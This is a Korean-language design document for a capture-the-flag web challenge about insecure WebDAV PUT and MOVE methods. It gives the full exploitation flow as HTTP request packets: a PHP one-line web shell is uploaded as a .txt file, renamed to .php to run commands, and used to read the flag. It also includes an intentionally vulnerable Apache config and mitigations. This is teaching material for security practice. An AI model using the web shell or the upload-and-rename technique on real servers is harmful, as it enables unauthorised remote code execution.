---
title: Insecure HTTP Methods (PUT / MOVE) WebDAV Abuse RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, http-methods, webdav, put, move, file-upload, shell-injection, rce]
confidence: high
---

# Insecure HTTP Methods (PUT / MOVE) WebDAV Abuse RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Legacy WebDAV File Storage (레거시 파일 공유소)
- **난이도**: Medium
- **핵심 컨셉**: 웹 서버 구성 오류로 인해 활성화된 위험한 HTTP 메소드를 악용하여 인증 없이 시스템에 파일을 업로드하고 명칭을 변경해 원격 코드를 실행하는 **Insecure HTTP Methods (PUT / MOVE) WebDAV Abuse RCE** 취약점 문제입니다. 대상 애플리케이션 서버는 파일의 업로드 및 협업 보관을 지원하기 위해 **WebDAV** 확장 모듈이 켜져 있으며, 이에 따라 일반 방문자가 인증 절차 없이 파일 업로드(`PUT`)와 파일 경로 변경(`MOVE`) 메소드를 사용할 수 있도록 허용되어 있습니다. 공격자는 실행 확장자(.jsp, .php 등) 파일 직접 업로드 차단 규칙을 우회하기 위해 무해한 텍스트 확장자로 먼저 파일을 임의 전송한 뒤, `MOVE` 메소드를 호출해 실행 웹쉘로 확장자를 전환하여 서버 제어 권한을 장악합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **WebDAV Enabled Directory (`/webshare/`)**:
  - 임의의 HTTP 메소드 요청(GET, POST, OPTIONS, PUT, DELETE, MOVE)을 수용하여 내부 파일 시스템 파일 작업을 수행하는 디렉터리 경로.
- **Flag 위치**:
  - 서버 파일 시스템 루트 경로 `/flag`에 파일 형태로 저장되어 있어 웹쉘 구동을 통해 조회 및 획득해야 합니다.

### 2.2 취약점 지점
1. **Unauthenticated PUT Method Enabled**:
   - 누구나 서버 상의 특정 디렉터리 경로에 임의의 파일 내용을 기입해 저장할 수 있는 쓰기 기능(`PUT`)이 노출되어 있습니다.
   - 단, 서버 단에서 웹 애플리케이션 방화벽(WAF)이나 파일 필터 모듈이 동작하여 `.php` / `.jsp` 등 서버 스크립트 실행 파일에 대한 직접적인 `PUT` 쓰기는 차단되는 상태입니다.
2. **MOVE Method to Rename Files**:
   - WebDAV 규격상 제공되는 `MOVE` 메소드는 파일의 경로 및 이름을 바꿀 수 있게 작동합니다.
   - 공격자는 이미 업로드 완료된 무해한 파일(예: `shell.txt`)을 실행 자원(예: `shell.php`)으로 우회 매핑 변환하는 확장자 교체 경로(`Destination` 헤더 사용)를 통제 및 실행할 수 있게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 허용 메소드 | 인증 필요성 | 필수 요청 헤더 | 공격 가능 동작 |
|------------|-------------|-------------|----------------|----------------|
| `/webshare/*` | OPTIONS, PUT, MOVE | 불필요 | `Destination: [Target_URL]` | 임의 파일 업로드 후 확장자 실행 파일 변환 및 웹쉘 실행 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 허용 HTTP 메소드 진단 (OPTIONS)
공격자는 타겟 스토리지 경로에 `OPTIONS` 요청을 보내 사용 가능한 HTTP 메소드 목록을 스캔합니다.
- **요청 패킷**:
  ```http
  OPTIONS /webshare/ HTTP/1.1
  Host: webdav.challenge.local
  ```
- **응답 헤더**:
  ```http
  HTTP/1.1 200 OK
  Allow: GET, POST, OPTIONS, PUT, DELETE, COPY, MOVE
  DAV: 1, 2
  ```
  응답 결과로 `PUT`과 `MOVE` 메소드가 정상 활성화되어 작동 중임을 인지합니다.

### Step 2. 텍스트 확장자 웹쉘 코드 PUT 업로드
직접 웹쉘 확장자로 업로드 시 WAF 필터에 차단되므로, 필터를 우회하기 위해 `.txt` 등 실행 불가능한 확장자로 백쉘 코드를 업로드합니다.
- **업로드 요청 패킷**:
  ```http
  PUT /webshare/helper.txt HTTP/1.1
  Host: webdav.challenge.local
  Content-Length: 53
  
  <?php echo shell_exec($_GET['cmd']); ?>
  ```
- **응답 결과**:
  `HTTP/1.1 201 Created` (서버 스토리지 공간에 `helper.txt` 파일 생성 성공)

### Step 3. MOVE 메소드를 이용한 확장자 변형 RCE 연계
업로드한 `helper.txt` 파일의 명칭을 서버 사이드 실행 코드가 가동되는 `.php` 확장자로 변경하여 이동시킵니다.
- **이동 변환 요청 패킷**:
  ```http
  MOVE /webshare/helper.txt HTTP/1.1
  Host: webdav.challenge.local
  Destination: http://webdav.challenge.local/webshare/helper.php
  ```
- **응답 결과**:
  `HTTP/1.1 201 Created` (혹은 `204 No Content` - 성공적으로 텍스트 파일이 PHP 파일로 이름 변경 완료됨)

### Step 4. 웹쉘 가동 및 flag 획득
1. 새로 갱신된 파일 경로로 웹 브라우저를 통해 악성 코드를 기동합니다.
   `GET /webshare/helper.php?cmd=cat%20/flag`
2. 웹 서버가 PHP 컴파일러를 통해 코드를 즉각 컴파일하고 `cat /flag` 명령의 수행 결과를 응답 바디로 리턴합니다.
3. 최종 반환된 텍스트 본문에서 플래그(`FLAG{webdav_insecure_put_move_methods_rce}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 및 웹 서버 설정 스니펫

### Apache Web Server (취약한 WebDAV 설정 예시)
```apache
# httpd.conf (Apache WebDAV 취약 설정 예시)
<Directory "/var/www/html/webshare">
    # WebDAV 확장 기능 기동
    Dav On

    # 취약점 지점 1: 모든 비인가 방문자가 인증 및 토큰 검증 없이 
    # PUT, DELETE, MOVE 등 민감한 메소드를 사용해 파일을 임의 변조 가능하도록 방치함
    <LimitExcept GET POST OPTIONS>
        Require all granted
    </LimitExcept>
</Directory>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **위험한 HTTP 메소드 비활성화 (Disable PUT/MOVE/DELETE)**:
   - 파일 공유 기능(WebDAV)이나 원격 업로드가 불필요한 일반 웹 서비스의 경우, 웹 서버 설정 파일(httpd.conf, nginx.conf 등)을 수정하여 `PUT`, `MOVE`, `DELETE` 등 비보안 메소드 활성화를 완전 차단 처리합니다.
2. **WebDAV 보안 인증 필수 수립 (Require Authentication)**:
   - 파일 보관소가 비즈니스상 필수적으로 기동되어야 한다면, 해당 디렉터리 경로에 진입 시 반드시 강력한 기본 인증(Basic Auth) 또는 JWT 세션 인증 필터링 통제망을 부착하여 비인가 접근을 기각합니다.
3. **업로드 디렉터리 내 스크립트 실행 권한 해제**:
   - 파일이 업로드되어 보관되는 디렉터리 영역(예: `/webshare/`)의 웹 서버 구성 속성을 제어하여, 어떤 확장자 파일이 들어오든 간에 서버 스크립트 엔진(PHP/JSP 등)을 통해 파일 실행이 트리거되지 않고 단순 다운로드 정적 파일로만 서빙되도록 `NoExec` 또는 `php_flag engine off` 속성을 가동합니다.
